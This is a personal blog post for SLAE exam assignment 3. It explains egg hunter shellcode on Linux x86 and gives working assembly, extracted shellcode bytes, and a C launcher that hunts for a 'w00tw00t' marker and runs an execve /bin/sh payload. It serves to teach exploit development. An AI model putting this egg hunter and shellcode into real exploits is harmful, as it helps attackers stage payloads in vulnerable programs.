# Assignment 3 - Egg Hunter Shellcode

Good afternoon, my fellow coffee and code enthusiasts. Today I'm studying up on the concept of an Egg Hunter, while drinking another medium roast from the  Yirgacheffe region of Ethiopia. This is my third assignment as a part of the SLAE exam, and I'm learning a ton. Read along and we'll figure out how to create our own egg hunter for linux/x86 systems...


## Problem Statement

* Study about the Egg Hunter shellcode
* Create a working demo of the Egg Hunter
* The demo should be configurable for different payloads

Sounds easy enough. Learn what an egg hunter is, and create a demo. Let's get to it.


## Initial Research

My initial research led me to [this paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) in which the author talks in-depth about what egg hunters are, and how to use them on Linux and Windows systems. Here, I will summarize what I learned that was able to get me through this assignment. However, I highly recommend taking a moment to read the paper in it's entirety, as it is very informative.

#### What is an Egg Hunter

An egg hunter is basically a piece of code that searches all memory ranges for an "egg". The egg is typically a unique set of 4 bytes, repeated twice, that the hunter can use to identify a section of code. Why is this necessary?

Let's say that you find a buffer overflow in an application, and you have a piece of reverse TCP shellcode that is 110 bytes long. However, upon investigating the vulnerable application, you find that only 50 bytes of your shellcode make it onto the stack. This is the perfect case for an egg hunter.

In this situation, you could insert your egg hunter onto the stack, and pass execution to it, while storing your reverse tcp shellcode (prefixed with your egg repeated twice) elsewhere in memory. Your egg hunter will then begin running, looking at all available memory until it finds the egg. Upon finding the egg, and verifying it repeats twice, the hunter will pass execution to that location in memory, enabling your shellcode to run without being placed directly onto the stack.


#### How to Egg Hunt

When reading the above statements, as a coder I can come up with a very naive algorithm for doing this, using the egg `w00t`.

```
Egg = "w00t"

Start at memory location x = 0

While True
  If 4 bytes at x == Egg
    If 4 bytes at x+4 == Egg
      Pass execution to x+8
    EndIf
  EndIf
  x = x+1
End While
```

The algorithm is basically this: "Read every memory location starting at 0, if you ever find w00tw00t, pass execution there." This is naive, but it's the best I've got at this early stage.

When we implement this, we'll hit a problem right off the bat. Obviously, our program does not have access to all memory. So, when it tries to read some addresses, we will get a segmentation fault. This is where the `access` call comes into play.

#### The access syscall
```c
int access(const char *pathname, int mode);
```

From the man page: "access()  checks  whether  the  calling process can access the file pathname." One of the errors returned by this function is the `EFAULT` error, which returns when the address pointed to by pathname points outside of our accessible address space. So, it sounds like we can pass our memory address to check into the access function, and use that to determine whether our process has access to that region of memory. For the mode parameter, it doesn't really matter, so we'll just use the constant F_OK.

**_Syscall Numbers_**

| Function  | Decimal   | Hex       |
| --------  | --------- | --------- |
| access    | 33        | 0x21      |

**_Constants_**

| Constant    | Decimal Value | Location                                 |
| --------    | ------------- | ---------------------------------------- |
| EFAULT      | 14            | /usr/include/libr/sflib/common/sftypes.h |
| F_OK        | 0             | /usr/include/unistd.h                    |

We'll need to convert EFAULT to an error value by using the 2's complement method. The 2's complement of 14 becomes 0xf2. So, if al contains 0xf2, we know that the EFAULT error was returned when attempting to access an address.

#### Virtual Address Space Pages

Another piece of information that is nice to know is this. Every process receives it's own Virtual Address Space (VAS). These VAS's given to processes are aligned to memory ranges called pages. So, if our egg hunter doesn't have access to a memory address, that means that it doesn't have access to the current page. On linux, we can use the following to figure out the memory page size on our system:

```bash
root@kali:~/courses/slae/exam# getconf PAGE_SIZE
4096
```

Perfect. 4096 is 0x1000 in hex. This will help us optimize our hunter by skipping a lot of addresses.


#### Refined Algorithm

```
Egg = "w00t"

Start at memory location x = 0

While True
  If x is accessible
    If 4 bytes at x == Egg
      If 4 bytes at x+4 == Egg
        Pass execution to x+8
      EndIf
    EndIf
    x = x+1
  Else
    x = x + 0x1000
  End If
End While
```


## First Approach

We now have all of the information needed to take a first stab at implementing our egg hunter. Let's see what it looks like...


**_assignment3.nasm_**

```
; Filename: assignment3.nasm
; Author:  Adam Brown
; Website:  http://coffeegist.com
;
;
; Purpose: Create Egg Hunting Shellcode for SLAE Exam, Assignment 3

global _start

section .text
_start:

  ; zero out
  xor ecx, ecx
  mul ecx

; VAS organized by "pages"
; PAGE_SIZE = 4096 (0x1000)
NEXT_REGION: ; prepare to align page
  or dx, 0xfff ; next instruction inc edx will move edx to new page

NEXT_ADDRESS: ; increment memory address to look at
  inc edx

; ACCESS check
; int access(const char *pathname, int mode);
; syscall # 33 (0x21)
;
; Argument Values
; *pathname - address we are checking (edx)
; mode - mode we are checking for F_OK=0 (ecx)

  lea ebx, [edx+0x4]
  xor eax, eax
  mov al, 0x21
  int 0x80

  ; check results
  cmp al, 0xf2 ; EFAULT = 14 -> 0xe -> 2's complement -> 0xf2
  jz short NEXT_REGION ; In a bad region, move to next page

  cmp dword [edx], 0x74303077 ; w00t
  jnz short NEXT_ADDRESS

  cmp dword [edx+4], 0x74303077 ; second w00t
  jnz short NEXT_ADDRESS

  add edx, 0x8 ; Move past the w00tw00t
  jmp edx
```


As a naive approach, this seems like it will work! Comparing it with the paper mentioned above, it just about matches up. We'll go ahead and put together our shellcode file, using an execve /bin/sh shellcode, and launch it to make sure everything executes as expected.

**_Generating the shellcode_**

```bash
root@kali:~/courses/slae/exam# nasm -f elf32 -o assignment3.o assignment3.nasm
root@kali:~/courses/slae/exam# ld -o assignment3 assignment3.o

root@kali:~/courses/slae/exam/assignment3# objdump -d ./assignment3|grep
 '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' '
 '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80
\x3c\xf2\x74\xed\x81\x3a\x77\x30\x30\x74\x75\xea\x81\x7a\x04\x77\x30\x30\x75
\xe1\x83\xc2\x08\xff\xe2"
```

**_shellcode.c_**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Hunting for w00tw00t
unsigned char eggHunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80"
"\x3c\xf2\x74\xed\x81\x3a\x77\x30\x30\x74\x75\xea\x81\x7a\x04\x77\x30\x30\x75"
"\xe1\x83\xc2\x08\xff\xe2";

unsigned char egg[] = "\x77\x30\x30\x74"; // w00t

unsigned char shellcode[] = \ // execve("/bin/sh", NULL, NULL);
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  int eggSize = strlen(egg);
  int shellcodeSize = strlen(shellcode);
  unsigned char* eggie = malloc((eggSize * 2) + shellcodeSize);

  memcpy(eggie, egg, eggSize);
  memcpy(&eggie[eggSize], egg, eggSize);
  memcpy(&eggie[eggSize * 2], shellcode, shellcodeSize);

  printf("Egg Hunter Length: %d\n", strlen(eggHunter));
  printf("Egg + Shellcode Length:  %d\n", strlen(shellcode));

  int (*ret)() = (int(*)())eggHunter;

  ret();
}
```

**_Running our Shellcode_**

```bash
root@kali:~/courses/slae/exam# gcc shellcode.c -o shellcode

root@kali:~/courses/slae/exam/assignment3# ./shellcode
Egg Hunter Length: 44
Egg + Shellcode Length:  36
root@kali:~/courses/slae/exam/assignment3#
```

Wait what?? Why did we not get our shell? This took a little gdb magic to figure out...

![gdb finds wrong instructions](gdb-assignment3.png)

If we look closely, we notice that our instructions in our egg hunter are wrong. Specifically, starting with this line:

`cmp    DWORD PTR [edx+0x4],0x75303077`

Looking back in our shellcode.c file, we indeed notice that there is a 0x74 byte missing. Going back and running `objdump -d assignment3 -M intel` will show us where to place it. It turns out the greppage I was using was not grabbing bytes if there were more than 6 on a line. Oops.

Fixing that allowed our egg hunter to work wondefully, and we were able to get our shell. Below is the final c code used to launch our egg hunter.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Hunting for w00tw00t
unsigned char eggHunter[] = \
"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80"
"\x3c\xf2\x74\xed\x81\x3a\x77\x30\x30\x74\x75\xea\x81\x7a\x04\x77\x30\x30\x74"
"\x75\xe1\x83\xc2\x08\xff\xe2";

unsigned char egg[] = "\x77\x30\x30\x74"; // w00t

unsigned char shellcode[] = \ // execve("/bin/sh", NULL, NULL);
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  int eggSize = strlen(egg);
  int shellcodeSize = strlen(shellcode);
  unsigned char* eggie = malloc((eggSize * 2) + shellcodeSize);

  memcpy(eggie, egg, eggSize);
  memcpy(&eggie[eggSize], egg, eggSize);
  memcpy(&eggie[eggSize * 2], shellcode, shellcodeSize);

  printf("Egg Hunter Length: %d\n", strlen(eggHunter));
  printf("Egg + Shellcode Length:  %d\n", strlen(shellcode));

  int (*ret)() = (int(*)())eggHunter;

  ret();
}
```


## Wrapping Up

With that, we have successfully implemented an egg hunter. I hope you learned a lot, as I did, and that you are able to take something away from this that you can use in your own projects. I will again mention that if you did not read the paper noted at the beginning of this post, you should go back and read it. There are some optimizations that can be done to our egg hunter to cut the time to run by 75%! Please leave a comment below if you have any questions, and have a great evening!


###### SLAE Exam Statement

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1158
